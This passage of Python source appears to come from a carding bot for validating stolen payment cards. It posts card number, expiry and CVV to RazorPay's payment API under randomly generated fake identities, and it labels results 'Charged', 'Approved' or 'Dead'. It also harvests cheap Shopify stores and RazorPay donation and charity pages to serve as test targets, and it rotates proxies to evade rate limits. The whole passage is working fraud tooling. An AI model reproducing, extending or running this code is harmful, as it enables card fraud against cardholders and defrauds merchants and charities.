        "origin": "https://api.razorpay.com",
        "referer": "https://api.razorpay.com/",
    })
    return s


def _rz_extract_link_id(html: str) -> str | None:
    for pat in (
        r'"payment_link_id"\s*:\s*"([^"]+)"',
        r'"paymentLinkId"\s*:\s*"([^"]+)"',
        r'payment_link_id["\']?\s*[:=]\s*["\']([^"\']+)',
    ):
        m = re.search(pat, html)
        if m:
            return m.group(1)
    return None


def _rz_classify(message: str) -> tuple[bool, str]:
    if not message:
        return False, "Error"
    ml = message.lower()
    if any(k in ml for k in ("payment successful", "captured", "paid")):
        return True, "Charged"
    if any(k in ml for k in (
        "insufficient funds", "insufficient_funds",
        "insufficient account balance",
        "incorrect cvv", "incorrect cvc", "invalid cvv", "invalid cvc",
        "authentication required", "3d secure", "3ds", "otp",
        "requires_action", "authentication_required",
    )):
        return False, "Approved"
    if any(k in ml for k in (
        "cancelled", "canceled", "declined", "failed",
        "do not honor", "stolen", "lost", "expired",
        "card_not_supported", "restricted",
    )):
        return False, "Dead"
    if any(k in ml for k in ("timeout", "try again", "network", "server error",
                              "502", "503", "504")):
        return False, "Error"
    return False, "Dead"


def run_razorpay_public(page_url: str, card_entry: str, proxy_url: str = "") -> dict:
    """RazorPay checkout via API-less flow."""
    t0 = time.time()
    page_url = (page_url or "").strip().rstrip("/")
    if not page_url.startswith(("http://", "https://")):
        page_url = "https://" + page_url

    parts = card_entry.replace("/", "|").split("|")
    if len(parts) != 4:
        return {"ok": False, "status": "Error", "message": "invalid card format",
                "time": 0.0, "site": page_url}
    cc, mm, yy, cvv = [p.strip() for p in parts]
    if len(yy) == 2:
        yy = "20" + yy
    mm = mm.zfill(2)

    if not CURL_CFFI_OK:
        return {"ok": False, "status": "Error",
                "message": "curl_cffi not installed",
                "time": 0.0, "site": page_url}

    client = _rz_new_client(proxy_url)
    try:
        try:
            r = client.get(page_url, timeout=20)
        except Exception as e:
            return {"ok": False, "status": "Error",
                    "message": f"page fetch: {str(e)[:100]}",
                    "time": round(time.time() - t0, 2), "site": page_url}

        if r.status_code != 200:
            return {"ok": False, "status": "Error",
                    "message": f"page HTTP {r.status_code}",
                    "time": round(time.time() - t0, 2), "site": page_url}

        html = r.text or ""
        link_id = _rz_extract_link_id(html)

        email = _rz_random_email()
        phone = random.choice(_RAZOR_PHONE)
        name = f"{random.choice(_RAZOR_FIRST)} {random.choice(_RAZOR_LAST)}"

        payload = {
            "amount": "100",
            "currency": "INR",
            "email": email,
            "contact": phone,
            "method": "card",
            "card[number]": cc,
            "card[name]": name,
            "card[expiry_month]": mm,
            "card[expiry_year]": yy,
            "card[cvv]": cvv,
        }
        if link_id:
            payload["payment_link_id"] = link_id

        try:
            resp = client.post(
                f"{_RAZOR_API}/payments/create/json",
                data=payload,
                timeout=30,
            )
        except Exception as e:
            return {"ok": False, "status": "Error",
                    "message": f"submit: {str(e)[:100]}",
                    "time": round(time.time() - t0, 2), "site": page_url}

        try:
            body = resp.json() if resp.text else {}
        except Exception:
            body = {"error": {"description": (resp.text or "")[:200]}}

        err = body.get("error") or {}
        description = (
            err.get("description")
            or err.get("reason")
            or err.get("field")
            or body.get("status")
            or body.get("message")
            or ""
        )

        ok, status = _rz_classify(str(description))

        if body.get("status") in ("captured", "authorized"):
            ok = True
            status = "Charged"

        return {
            "ok":      ok,
            "status":  status,
            "message": (str(description) or "Unknown")[:200],
            "time":    round(time.time() - t0, 2),
            "site":    page_url,
        }
    except Exception as e:
        return {"ok": False, "status": "Error",
                "message": f"engine: {str(e)[:120]}",
                "time": round(time.time() - t0, 2), "site": page_url}
    finally:
        try:
            client.close()
        except Exception:
            pass


# =============================================================================
# SECTION 28 — INLINE SHOPIFY HARVESTER
# =============================================================================
_HARVEST_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]

_HARVEST_DIRECTORY = [
    "https://shop.app/api/search?query={q}&limit=250",
]

_DEFAULT_KEYWORDS = [
    "coffee", "tea", "candle", "soap", "skincare", "beauty",
    "fashion", "clothing", "jewelry", "accessories", "home", "kitchen",
    "toys", "pets", "fitness", "sports", "outdoor", "books", "snacks",
    "wine", "supplements", "boutique", "vintage", "handmade", "wellness",
]


def _harvest_normalize(raw: str) -> str:
    if not raw:
        return ""
    s = str(raw).strip().lower()
    s = re.sub(r"^https?://", "", s)
    s = s.rstrip("/").split("/")[0].split("?")[0]
    if s.startswith("www."):
        s = s[4:]
    if not s or "." not in s:
        return ""
    if not re.match(r"^[a-z0-9]([a-z0-9\-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9\-]*[a-z0-9])?)+$", s):
        return ""
    return s


def _harvest_probe(domain: str, proxy_url: str | None,
                    min_price: float, max_price: float,
                    timeout: float = 10.0) -> dict:
    if not domain:
        return {"url": "", "ok": False, "reason": "empty", "price": 0.0}

    url = f"https://{domain}"
    if proxy_url and not proxy_url.startswith(("http://", "https://", "socks")):
        seg = proxy_url.split(":")
        if len(seg) == 4:
            proxy_url = f"http://{seg[2]}:{seg[3]}@{seg[0]}:{seg[1]}"
        elif len(seg) == 2:
            proxy_url = f"http://{seg[0]}:{seg[1]}"

    probe_url = f"{url}/products.json?limit=50"
    kw = {
        "timeout": timeout,
        "follow_redirects": False,
        "headers": {"User-Agent": random.choice(_HARVEST_UA),
                    "Accept": "application/json"},
    }
    if proxy_url:
        kw["proxy"] = proxy_url

    try:
        r = httpx.get(probe_url, **kw)
        if r.status_code != 200:
            return {"url": url, "ok": False, "reason": f"HTTP {r.status_code}", "price": 0.0}
        if '"products"' not in (r.text or ""):
            return {"url": url, "ok": False, "reason": "not shopify", "price": 0.0}
        data = r.json()
        prods = data.get("products") or []
        if not prods:
            return {"url": url, "ok": False, "reason": "no products", "price": 0.0}

        cheapest = float("inf")
        for p in prods:
            for v in p.get("variants") or []:
                if v.get("available") is False:
                    continue
                try:
                    pf = float(v.get("price") or 0)
                except (TypeError, ValueError):
                    continue
                if pf <= 0:
                    continue
                if pf < cheapest:
                    cheapest = pf
        if cheapest == float("inf"):
            return {"url": url, "ok": False, "reason": "all OOS", "price": 0.0}
        if cheapest > max_price:
            return {"url": url, "ok": False, "reason": f"over ${max_price}", "price": cheapest}
        if cheapest < min_price:
            return {"url": url, "ok": False, "reason": f"under ${min_price}", "price": cheapest}
        return {"url": url, "ok": True, "reason": f"${cheapest:.2f}", "price": cheapest}
    except httpx.TimeoutException:
        return {"url": url, "ok": False, "reason": "timeout", "price": 0.0}
    except httpx.ProxyError as e:
        return {"url": url, "ok": False, "reason": f"proxy: {str(e)[:40]}", "price": 0.0}
    except Exception as e:
        return {"url": url, "ok": False, "reason": str(e)[:60], "price": 0.0}


def _harvest_read_lines(path: str) -> list:
    if not os.path.exists(path):
        return []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [ln.strip() for ln in f if ln.strip()]
    except Exception:
        return []


def _harvest_write_lines(path: str, lines: list):
    with open(path, "w", encoding="utf-8") as f:
        for ln in lines:
            f.write(ln + "\n")


def sh_scan_file(src_path: str, dst_path: str, proxy: str | None,
                  min_price: float, max_price: float, workers: int = 30,
                  on_progress=None):
    raw = _harvest_read_lines(src_path)
    domains = []
    seen = set()
    for r in raw:
        d = _harvest_normalize(r)
        if d and d not in seen:
            seen.add(d)
            domains.append(d)

    live, dead, over, errors = [], [], [], []
    total = len(domains)
    if total == 0:
        return live, dead, over, errors

    done = [0]
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(_harvest_probe, d, proxy, min_price, max_price): d for d in domains}
        for fut in as_completed(futs):
            d = futs[fut]
            try:
                res = fut.result()
            except Exception as e:
                res = {"url": f"https://{d}", "ok": False,
                       "reason": str(e)[:60], "price": 0.0}
            done[0] += 1
            if res["ok"]:
                live.append(res["url"])
            elif "over" in res.get("reason", ""):
                over.append(res["url"])
            elif res.get("reason", "").startswith(("timeout", "proxy")):
                errors.append(res["url"])
            else:
                dead.append(res["url"])
            if on_progress:
                try:
                    on_progress(done[0], total, res)
                except Exception:
                    pass

    _harvest_write_lines(dst_path, live)
    return live, dead, over, errors


def sh_harvest_from_seeds(seeds: list, keyword: str | None, dst_path: str,
                            proxy: str | None, min_price: float, max_price: float,
                            workers: int = 30, on_progress=None):
    candidates = []
    seen = set()

    for s in seeds:
        d = _harvest_normalize(s)
        if d and d not in seen:
            seen.add(d)
            candidates.append(d)

    kws = [keyword] if keyword else []
    kws.extend(_DEFAULT_KEYWORDS)
    kws = [re.sub(r"[^a-z0-9\-]", "", k.lower()) for k in kws if k]
    kws = [k for k in kws if k]

    for kw in kws[:5]:
        try:
            url = _HARVEST_DIRECTORY[0].format(q=urllib.parse.quote(kw))
            r = httpx.get(url, timeout=12, follow_redirects=True,
                          headers={"User-Agent": random.choice(_HARVEST_UA)})
            if r.status_code == 200:
                try:
                    data = r.json()
                    for entry in data.get("results", []) if isinstance(data, dict) else []:
                        for key in ("domain", "shop_domain", "url"):
                            v = entry.get(key) if isinstance(entry, dict) else None
                            if v:
                                d = _harvest_normalize(v)
                                if d and d not in seen:
                                    seen.add(d)
                                    candidates.append(d)
                except Exception:
                    pass
        except Exception:
            pass

    suffixes = ["", "shop", "store", "co", "official", "us", "uk", "india"]
    for kw in kws[:20]:
        if len(candidates) >= 500:
            break
        for suf in suffixes:
            slug = f"{kw}{suf}" if suf else kw
            d = f"{slug}.myshopify.com"
            if d not in seen:
                seen.add(d)
                candidates.append(d)

    live, dead, over, errors = [], [], [], []
    done = [0]
    total = len(candidates)
    if total == 0:
        return live, dead, over, errors

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(_harvest_probe, d, proxy, min_price, max_price): d for d in candidates}
        for fut in as_completed(futs):
            d = futs[fut]
            try:
                res = fut.result()
            except Exception as e:
                res = {"url": f"https://{d}", "ok": False,
                       "reason": str(e)[:60], "price": 0.0}
            done[0] += 1
            if res["ok"]:
                live.append(res["url"])
            elif "over" in res.get("reason", ""):
                over.append(res["url"])
            elif res.get("reason", "").startswith(("timeout", "proxy")):
                errors.append(res["url"])
            else:
                dead.append(res["url"])
            if on_progress:
                try:
                    on_progress(done[0], total, res)
                except Exception:
                    pass

    existing = _harvest_read_lines(dst_path)
    existing_set = {_harvest_normalize(u) for u in existing if u}
    appended = 0
    for u in live:
        d = _harvest_normalize(u)
        if d and d not in existing_set:
            existing.append(u)
            existing_set.add(d)
            appended += 1
    if appended:
        _harvest_write_lines(dst_path, existing)

    return live, dead, over, errors


# =============================================================================
# SECTION 29 — INLINE RAZORPAY HARVESTER
# =============================================================================
_RZ_SLUG_HINTS = [
    "donate", "donation", "pay", "payment", "paynow", "checkout",
    "fees", "booking", "order", "store", "shop", "buy", "cart",
    "subscription", "subscribe", "register", "ticket", "course",
    "schoolfees", "collegefees", "tuition", "seva", "daan",
    "fund", "temple", "church", "mandir", "trust", "foundation",
    "ngo", "charity", "welfare", "sponsor", "support",
]


def _rz_harvest_probe(url: str, proxy: str | None, timeout: float = 10.0) -> dict:
    if not url:
        return {"url": "", "ok": False, "reason": "empty"}
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    if proxy and not proxy.startswith(("http://", "https://", "socks")):
        seg = proxy.split(":")
        if len(seg) == 4:
            proxy = f"http://{seg[2]}:{seg[3]}@{seg[0]}:{seg[1]}"
        elif len(seg) == 2:
            proxy = f"http://{seg[0]}:{seg[1]}"

    kw = {
        "timeout": timeout,
        "follow_redirects": True,
        "headers": {"User-Agent": random.choice(_HARVEST_UA),
                    "Accept": "text/html,application/xhtml+xml"},
    }
    if proxy:
        kw["proxy"] = proxy

    try:
        r = httpx.get(url, **kw)
        if r.status_code != 200:
            return {"url": url, "ok": False, "reason": f"HTTP {r.status_code}"}
        body = r.text or ""
        markers = ("payment_link_id", "razorpay", "checkout.js", "rzp_")
        if not any(m in body for m in markers):
            return {"url": url, "ok": False, "reason": "not razorpay"}
        if any(m in body.lower() for m in ("link expired", "link not found", "no longer active")):
            return {"url": url, "ok": False, "reason": "link expired"}
        return {"url": url, "ok": True, "reason": "ok"}
    except httpx.TimeoutException:
        return {"url": url, "ok": False, "reason": "timeout"}
    except httpx.ProxyError as e:
        return {"url": url, "ok": False, "reason": f"proxy: {str(e)[:40]}"}
    except Exception as e:
        return {"url": url, "ok": False, "reason": str(e)[:60]}


def rz_scan_file(src_path: str, dst_path: str, proxy: str | None,
                  workers: int = 30, on_progress=None):
    raw = _harvest_read_lines(src_path)
    urls = []
    seen = set()
    for r in raw:
        u = r.strip().rstrip("/")
        if not u.startswith(("http://", "https://")):
            u = "https://" + u
        if u not in seen:
            seen.add(u)
            urls.append(u)

    live, dead, errors = [], [], []
    total = len(urls)
    if total == 0:
        return live, dead, errors

    done = [0]
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(_rz_harvest_probe, u, proxy): u for u in urls}
        for fut in as_completed(futs):
            u = futs[fut]
            try:
                res = fut.result()
            except Exception as e:
                res = {"url": u, "ok": False, "reason": str(e)[:60]}
            done[0] += 1
            if res["ok"]:
                live.append(res["url"])
            elif res.get("reason", "").startswith(("timeout", "proxy")):
                errors.append(res["url"])
            else:
                dead.append(res["url"])
            if on_progress:
                try:
                    on_progress(done[0], total, res)
                except Exception:
                    pass

    _harvest_write_lines(dst_path, live)
    return live, dead, errors


def rz_harvest_from_seeds(seeds: list, keyword: str | None, dst_path: str,
                            proxy: str | None, workers: int = 30, on_progress=None):
    candidates = []
    seen = set()

    for s in seeds:
        slug = re.sub(r"[^a-zA-Z0-9\-_]", "", s.rstrip("/").split("/")[-1])
        if not slug:
            continue
        u = f"https://pages.razorpay.com/{slug}"
        if u not in seen:
            seen.add(u)
            candidates.append(u)

    hints = list(_RZ_SLUG_HINTS)
    if keyword:
        kw = re.sub(r"[^a-z0-9\-]", "", keyword.lower())
        if kw:
            hints = [kw] + [f"{kw}{s}" for s in ("now", "pay", "donate", "page")] + hints

    for slug in hints:
        if len(candidates) >= 500:
            break
        u = f"https://pages.razorpay.com/{slug}"
        if u not in seen:
            seen.add(u)
            candidates.append(u)

    live, dead, errors = [], [], []
    total = len(candidates)
    if total == 0:
        return live, dead, errors

    done = [0]
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(_rz_harvest_probe, u, proxy): u for u in candidates}
        for fut in as_completed(futs):
            u = futs[fut]
            try:
                res = fut.result()
            except Exception as e:
                res = {"url": u, "ok": False, "reason": str(e)[:60]}
            done[0] += 1
            if res["ok"]:
                live.append(res["url"])
            elif res.get("reason", "").startswith(("timeout", "proxy")):
                errors.append(res["url"])
            else:
                dead.append(res["url"])
            if on_progress:
                try:
                    on_progress(done[0], total, res)
                except Exception:
                    pass

    existing = _harvest_read_lines(dst_path)
    existing_set = {u.strip().rstrip("/") for u in existing if u}
    appended = 0
    for u in live:
        if u not in existing_set:
            existing.append(u)
            existing_set.add(u)
            appended += 1
    if appended:
        _harvest_write_lines(dst_path, existing)

    return live, dead, errors


# =============================================================================
# SECTION 30 — ENGINE AVAILABILITY FLAGS (always True now — inlined)
# =============================================================================
CHECKOUT_ENGINE_OK = CURL_CFFI_OK
_CE_IMPORT_ERR = None if CURL_CFFI_OK else "curl_cffi not installed"

RAZORPAY_ENGINE_OK = CURL_CFFI_OK
_RZ_IMPORT_ERR = None if CURL_CFFI_OK else "curl_cffi not installed"

SHOPIFY_HARVESTER_OK = True
_SH_HARVEST_ERR = None

RZ_HARVESTER_OK = True
_RH_HARVEST_ERR = None

ENGINE_PROXY_CHECK_OK = CURL_CFFI_OK


# =============================================================================
# SECTION 31 — BOT CHECK WRAPPERS (invoke the inline engines)
# =============================================================================
async def check_card_shopify(card: str, site: str, proxy: str = None, http_session=None):
    if proxy:
        proxy = _strip_country_from_proxy(proxy)

    if not CHECKOUT_ENGINE_OK:
        return {'status': 'Error',
                'message': f'engine missing: {_CE_IMPORT_ERR}',
                'card': card, 'site': site, 'gateway': 'Shopify',
                'price': '-', 'price_value': 0.0,
                'proxy': proxy, 'status_code': 'ENGINE_MISSING',
                'retryable': False}, proxy

    parts = card.split('|')
    if len(parts) != 4:
        return {'status': 'Dead', 'message': 'Invalid format',
                'card': card, 'site': site, 'gateway': 'Shopify',
                'price': '-', 'price_value': 0.0,
                'proxy': proxy, 'status_code': 'CARD_INVALID',
                'retryable': False}, proxy

    proxy_url = proxy_to_url(proxy) if proxy else ""
    site_clean = re.sub(r'^https?://', '', site).rstrip('/')
    if not site_clean.startswith(('http://', 'https://')):
        site_clean = 'https://' + site_clean

    loop = asyncio.get_running_loop()
    try:
        result = await loop.run_in_executor(
            None, run_checkout_public, site_clean, card, proxy_url, True
        )
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return {'status': 'Error', 'message': str(e)[:120],
                'card': card, 'site': site, 'gateway': 'Shopify',
                'price': '-', 'price_value': 0.0,
                'proxy': proxy, 'status_code': 'EXCEPTION',
                'retryable': True}, proxy

    result['site'] = site
    return result, proxy


def _rz_normalize(result: dict, card: str, proxy: str) -> dict:
    ok = result.get("ok", False)
    status_raw = result.get("status", "Dead")
    msg = result.get("message") or result.get("response") or "Unknown"

    if ok:
        status = "Charged"
    elif status_raw in ("Charged", "Approved", "3DS"):
        status = status_raw
    elif status_raw == "Error":
        status = "Error"
    else:
        status = "Dead"

    return {
        "status": status,
        "Response": msg,
        "message": msg,
        "Price": "-",
        "price": "-",
        "price_value": 0.0,
        "Gateway": "RazorPay",
        "gateway": "RazorPay",
        "card": card,
        "site": result.get("site", ""),
        "proxy": proxy,
        "status_code": status,
        "retryable": status == "Error",
        "duration_ms": int(result.get("time", 0) * 1000),
    }


async def check_rz_card(card: str, proxy: str = None, http_session=None, site: str = None):
    if not RAZORPAY_ENGINE_OK:
        return {"status": "Error", "message": f"razorpay engine missing: {_RZ_IMPORT_ERR}",
                "Response": f"razorpay engine missing",
                "card": card, "Gateway": "RazorPay", "gateway": "RazorPay",
                "price": "-", "price_value": 0.0, "retryable": False,
                "proxy": proxy, "status_code": "ENGINE_MISSING"}, proxy

    if not site:
        sites = load_rz_sites()
        if not sites:
            return {"status": "Error", "message": "No Razorpay sites configured",
                    "Response": "No Razorpay sites configured",
                    "card": card, "Gateway": "RazorPay", "gateway": "RazorPay",
                    "price": "-", "price_value": 0.0, "retryable": False,
                    "proxy": proxy, "status_code": "NO_RZ_SITES"}, proxy
        site = sites[0]

    proxy_url = proxy_to_url(proxy) if proxy else ""

    loop = asyncio.get_running_loop()
    try:
        result = await loop.run_in_executor(
            None, run_razorpay_public, site, card, proxy_url
        )
    except Exception as e:
        return {"status": "Error", "message": str(e)[:150],
                "Response": str(e)[:150], "card": card,
                "Gateway": "RazorPay", "gateway": "RazorPay",
                "price": "-", "price_value": 0.0, "retryable": True,
                "proxy": proxy, "status_code": "EXCEPTION"}, proxy

    result["site"] = site
    return _rz_normalize(result, card, proxy), proxy


# =============================================================================
# SECTION 32 — CHECK WITH RETRY
# =============================================================================
async def check_card_with_retry(card: str, sites: list, proxies: list,
                                max_retries: int = 2, rotator=None, http_session=None):
    if not sites:
        return {'status': 'Error', 'message': 'No sites', 'card': card,
                'gateway': 'Unknown', 'price': '-', 'price_value': 0.0,
                'retryable': False}, None
    if not proxies:
        return {'status': 'Error', 'message': 'No proxies', 'card': card,
                'gateway': 'Unknown', 'price': '-', 'price_value': 0.0,
                'retryable': False}, None

    rotator = rotator or SmartRotator()
    tried_sites, tried_proxies = set(), set()
    last_result, last_proxy = None, None

    ranked_sites = _get_active_sites(sites)
    if ranked_sites:
        sites = ranked_sites

    for attempt in range(max_retries):
        site = rotator.pick_site(sites, exclude=tried_sites)
        if not site:
            tried_sites.clear()
            site = rotator.pick_site(sites)
        if not site:
            break
        tried_sites.add(site)

        proxy = await _pick_smart_proxy(card, proxies)
        if not proxy or proxy in tried_proxies:
            proxy = rotator.pick_proxy(proxies, exclude=tried_proxies)
        if proxy:
            tried_proxies.add(proxy)
        last_proxy = proxy

        result, used_proxy = await _safe_call(
            check_card_shopify(card, site, proxy, http_session),
            SHOPIFY_SINGLE_TIMEOUT,
            {'status': 'Error', 'message': 'timeout',
             'card': card, 'site': site, 'gateway': 'Shopify',
             'price': '-', 'price_value': 0.0,
             'proxy': proxy, 'status_code': 'TIMEOUT',
             'retryable': True},
        )
        last_proxy = used_proxy or last_proxy
        last_result = result

        status = result.get('status', 'Dead')
        retryable = result.get('retryable', False)
        msg = (result.get('message') or '').lower()

        try:
            _site_report(site, status)
        except Exception:
            pass

        if status in ('Charged', 'Approved', '3DS'):
            return result, last_proxy
        if status == 'Dead' and not retryable:
            return result, last_proxy
        if 'no variant' in msg:
            return result, last_proxy

        if '429' in msg or 'rate limit' in msg or 'throttl' in msg:
            await asyncio.sleep(10 + random.random() * 5)
        else:
            await asyncio.sleep(0)

    return last_result or {'status': 'Error', 'message': 'All attempts failed',
                           'card': card, 'gateway': 'Unknown',
                           'price': '-', 'price_value': 0.0,
                           'retryable': True}, last_proxy


async def check_rz_with_retry(card: str, proxies: list, max_retries: int = 2,
                              rotator=None, http_session=None, sites: list = None):
    if not RAZORPAY_ENGINE_OK:
        return {"status": "Error", "message": f"razorpay engine missing: {_RZ_IMPORT_ERR}",
                "Response": f"razorpay engine missing", "card": card,
                "Gateway": "RazorPay", "gateway": "RazorPay",
                "price": "-", "price_value": 0.0, "retryable": False}, None

    if not sites:
        sites = load_rz_sites()
    if not sites:
        return {"status": "Error", "message": "No Razorpay sites",
                "Response": "No Razorpay sites",
                "card": card, "Gateway": "RazorPay", "gateway": "RazorPay",
                "price": "-", "price_value": 0.0, "retryable": False}, None
    if not proxies:
        return {"status": "Error", "message": "No proxies",
                "Response": "No proxies",
                "card": card, "Gateway": "RazorPay", "gateway": "RazorPay",
                "price": "-", "price_value": 0.0, "retryable": False}, None

    tried_sites, tried_proxies = set(), set()
    last_result, last_proxy = None, None

    for attempt in range(max_retries):
        site = (rotator.pick_site(sites, exclude=tried_sites) if rotator
                else random.choice(sites))
        if not site:
            break
        tried_sites.add(site)

        proxy = (rotator.pick_proxy(proxies, exclude=tried_proxies) if rotator
                 else random.choice(proxies))
        if proxy:
            tried_proxies.add(proxy)
        last_proxy = proxy

        result, used_proxy = await _safe_call(
            check_rz_card(card, proxy, http_session, site=site),
            RAZORPAY_SINGLE_TIMEOUT,
            {"status": "Error", "message": "timeout",
             "Response": "timeout", "card": card,
             "Gateway": "RazorPay", "gateway": "RazorPay",
             "price": "-", "price_value": 0.0, "retryable": True,
             "proxy": proxy, "status_code": "TIMEOUT"},
        )
        last_proxy = used_proxy or last_proxy
        last_result = result

        status = result.get("status", "Dead")
        if status in ("Charged", "Approved", "3DS"):
            return result, last_proxy
        if status == "Dead" and not result.get("retryable", False):
            return result, last_proxy

        if attempt < max_retries - 1:
            await asyncio.sleep(1 + random.random())

    return last_result or {"status": "Error", "message": "All attempts failed",
                           "Response": "All attempts failed", "card": card,
                           "Gateway": "RazorPay", "gateway": "RazorPay",
                           "price": "-", "price_value": 0.0, "retryable": True}, last_proxy


# =============================================================================
# SECTION 33 — PROXY TEST
# =============================================================================
async def test_proxy(proxy: str):
    proxy_url = proxy_to_url(proxy)
    session = await get_proxy_session()
    try:
        async with session.get(
            "https://cdn.shopify.com/",
            proxy=proxy_url,
            timeout=aiohttp.ClientTimeout(total=10, connect=6),
            allow_redirects=False,
        ) as r:
            if r.status in (200, 301, 302, 401, 403, 404):
                if ENGINE_PROXY_CHECK_OK:
                    try:
                        loop = asyncio.get_running_loop()
                        ok = await loop.run_in_executor(
                            None, is_proxy_alive, proxy_url, 6.0
                        )
                        if not ok:
                            return {'proxy': proxy, 'status': 'dead',
                                    'reason': 'engine TLS check failed'}
                    except Exception as e:
                        log_system("PROXY_ENGINE_CHECK",
                                   f"{proxy[:40]}: {e!r}", "warning")
                        return {'proxy': proxy, 'status': 'dead',
                                'reason': f'engine check error: {type(e).__name__}'}
                ip = '?'
                try:
                    async with session.get(
                        'https://api.ipify.org?format=json',
                        proxy=proxy_url,
                        timeout=aiohttp.ClientTimeout(total=6, connect=4),
                    ) as ir:
                        if ir.status == 200:
                            data = await ir.json(content_type=None)
                            ip = data.get('ip', '?')
                except Exception:
                    pass
                return {'proxy': proxy, 'status': 'alive', 'ip': ip}
            if r.status == 407:
                return {'proxy': proxy, 'status': 'dead',
                        'reason': 'proxy auth required (407)'}
    except Exception as e:
        return {'proxy': proxy, 'status': 'dead',
                'reason': f'{type(e).__name__}: {str(e)[:60]}'}
    return {'proxy': proxy, 'status': 'dead',
            'reason': 'no Shopify reachability'}


# =============================================================================
# SECTION 34 — FAST SITE PROBE
# =============================================================================
async def _quick_shopify_alive(domain: str, proxy: str = None) -> bool:
    if not domain:
        return False
    domain = domain.strip().lower()
    domain = re.sub(r'^https?://', '', domain).rstrip('/').split('/')[0]
    if not domain or '.' not in domain:
        return False
    url = f"https://{domain}/products.json?limit=25"
    proxy_url = proxy_to_url(proxy) if proxy else None
    min_price = get_min_price()
    max_price = get_threshold()
    session = await get_http_session()
    try:
        kw = {
            "timeout": aiohttp.ClientTimeout(total=8, connect=5),
            "allow_redirects": False,
            "headers": {"User-Agent": random.choice(_HARVEST_UA)},
        }
        if proxy_url:
            kw["proxy"] = proxy_url
        async with session.get(url, **kw) as r:
            if r.status != 200:
                return False
            body = await r.text()
            if '"products"' not in body:
                return False
            try:
                data = json.loads(body)
            except Exception:
                return False
            for p in data.get("products", []) or []:
                for v in p.get("variants", []) or []:
                    if v.get("available") is False:
                        continue
                    try:
                        pf = float(v.get("price") or 0)
                    except (TypeError, ValueError):
                        continue
                    if min_price <= pf <= max_price:
                        return True
    except Exception:
        return False
    return False


async def test_site_with_price(site: str, proxy: str = None) -> dict:
    if not site:
        return {'site': site, 'status': 'dead', 'price': 0.0,
                'response': 'Empty site'}
    if not proxy:
        return {'site': site, 'status': 'proxy_error', 'price': 0.0,
                'response': 'No proxy'}

    domain = re.sub(r'^https?://', '', site).rstrip('/').split('/')[0]
    if not domain or '.' not in domain:
        return {'site': site, 'status': 'dead', 'price': 0.0,
                'response': 'Invalid domain'}

    proxy_url = proxy_to_url(proxy)
    min_price = get_min_price()
    max_price = get_threshold()
    session = await get_http_session()
    url = f"https://{domain}/products.json?limit=50"

    try:
        kw = {
            "timeout": aiohttp.ClientTimeout(total=8, connect=5),
            "allow_redirects": False,
            "headers": {"User-Agent": random.choice(_HARVEST_UA)},
            "proxy": proxy_url,
        }
        async with session.get(url, **kw) as r:
            if r.status == 407:
                return {'site': site, 'status': 'proxy_error', 'price': 0.0,
                        'response': 'Proxy auth required (407)'}
            if r.status != 200:
                return {'site': site, 'status': 'dead', 'price': 0.0,
                        'response': f'HTTP {r.status}'}
            body = await r.text()
            if '"products"' not in body:
                return {'site': site, 'status': 'dead', 'price': 0.0,
                        'response': 'Not a Shopify store'}
            try:
                data = json.loads(body)
            except Exception:
                return {'site': site, 'status': 'dead', 'price': 0.0,
                        'response': 'Invalid JSON'}
            prods = data.get("products") or []
            if not prods:
                return {'site': site, 'status': 'dead', 'price': 0.0,
                        'response': 'No products'}
            cheapest = float('inf')
            for p in prods:
                for v in p.get("variants", []) or []:
                    if v.get("available") is False:
                        continue
                    try:
                        pf = float(v.get("price") or 0)
                    except (TypeError, ValueError):
                        continue
                    if pf <= 0:
                        continue
                    if pf < cheapest:
                        cheapest = pf
            if cheapest == float('inf'):
                return {'site': site, 'status': 'dead', 'price': 0.0,
                        'response': 'All out of stock'}
            if cheapest > max_price:
                return {'site': site, 'status': 'over', 'price': cheapest,
                        'response': f'Over ${max_price:.2f}'}
            if cheapest < min_price:
                return {'site': site, 'status': 'dead', 'price': cheapest,
                        'response': f'Below ${min_price:.2f}'}
            return {'site': site, 'status': 'alive', 'price': cheapest,
                    'response': f'${cheapest:.2f} ✓'}
    except asyncio.TimeoutError:
        return {'site': site, 'status': 'proxy_error', 'price': 0.0,
                'response': 'Timeout'}
    except Exception as e:
        err = str(e)
        low = err.lower()
        if any(k in low for k in ('proxy', '407', 'tunnel', 'resolve proxy')):
            return {'site': site, 'status': 'proxy_error', 'price': 0.0,
                    'response': f'Proxy: {err[:50]}'}
        return {'site': site, 'status': 'dead', 'price': 0.0,
                'response': err[:60]}


# =============================================================================
# SECTION 35 — SITE TEST RUNNER
# =============================================================================
async def _run_site_tests(event, uid, to_test, status_msg, initial_sites_count,
                          existing=None, wipe=False):
    threshold = get_threshold()
    proxies = load_user_proxies(uid)
    if not proxies:
        return await status_msg.edit(pe(f"💎 <b>{bs('Need proxies first')}</b>"))

    sem = get_user_sem(uid, "site")
    alive, dead, over, unknown, proxy_err = [], 0, 0, 0, 0
    checked = 0

    async def _check_one(site):
        nonlocal checked, dead, over, unknown, proxy_err
        proxy_choice = random.choice(proxies)
        clean = _strip_country_from_proxy(proxy_choice)
        async with sem:
            res = await test_site_with_price(site, clean)
        checked += 1
        st = res.get('status')
        reason = (res.get('response') or '')[:100]
        if st in ('alive', 'proxy_error'):
            log_system("SITE_TEST", f"{site} -> {st} | {reason}")
        if st == 'alive':
            alive.append(site)
        elif st == 'over':
            over += 1
        elif st == 'proxy_error':
            proxy_err += 1
        elif st == 'unknown':
            unknown += 1
        else:
            dead += 1

    try:
        for i in range(0, len(to_test), SITE_PER_USER_WORKERS):
            batch = to_test[i:i + SITE_PER_USER_WORKERS]
            await asyncio.gather(*[_check_one(s) for s in batch])
            try:
